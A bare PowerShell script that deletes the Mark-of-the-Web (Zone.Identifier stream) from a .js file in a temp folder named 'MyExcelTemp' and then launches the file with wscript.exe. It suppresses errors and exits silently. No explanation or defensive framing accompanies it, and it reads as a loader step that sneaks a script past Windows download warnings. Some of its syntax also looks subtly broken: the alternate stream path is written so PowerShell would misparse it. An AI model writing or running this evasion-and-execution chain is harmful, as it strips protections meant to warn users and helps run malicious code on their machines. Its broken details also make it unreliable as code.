# Use the temp folder path
$folderPath = "$env:TEMP\MyExcelTemp"

# Remove MOTW from .js file (and any other if needed)
$jsFile = Join-Path $folderPath "MyFile.js"
$zoneIdStream = "$jsFile:Zone.Identifier"
if (Get-Item -Path $zoneIdStream -ErrorAction SilentlyContinue) {
    try {
        Remove-Item -Path $zoneIdStream -Force
    }
    catch {
        # Fail silently
    }
}

# ---- RUN THE JS FILE ----
Start-Sleep -Seconds 1
Start-Process "wscript.exe" -ArgumentList "`"$jsFile`""

# Exit silently
exit